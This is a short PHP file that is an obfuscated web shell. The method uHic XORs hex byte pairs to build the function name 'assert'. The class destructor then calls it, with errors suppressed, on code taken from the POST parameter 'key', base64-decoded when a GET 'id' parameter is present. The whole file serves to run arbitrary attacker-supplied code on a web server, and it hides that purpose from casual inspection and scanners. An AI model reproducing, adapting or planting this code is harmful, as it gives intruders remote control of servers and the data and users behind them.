<?php 
class NZXF { 
    function uHic() {
        $CPoh = "\xad" ^ "\xcc";
        $fYXh = "\x4f" ^ "\x3c";
        $qntW = "\x8d" ^ "\xfe";
        $kPLH = "\xaf" ^ "\xca";
        $QqKC = "\xd8" ^ "\xaa";
        $RaQr = "\xf8" ^ "\x8c";
        $PskD =$CPoh.$fYXh.$qntW.$kPLH.$QqKC.$RaQr;
        return $PskD;
    }
    function __destruct(){
        $bdzE=$this->uHic();
        @$bdzE($this->ZX);
    }
}
$nzxf = new NZXF();
@$nzxf->ZX = isset($_GET['id'])?base64_decode($_POST['key']):$_POST['key'];
?>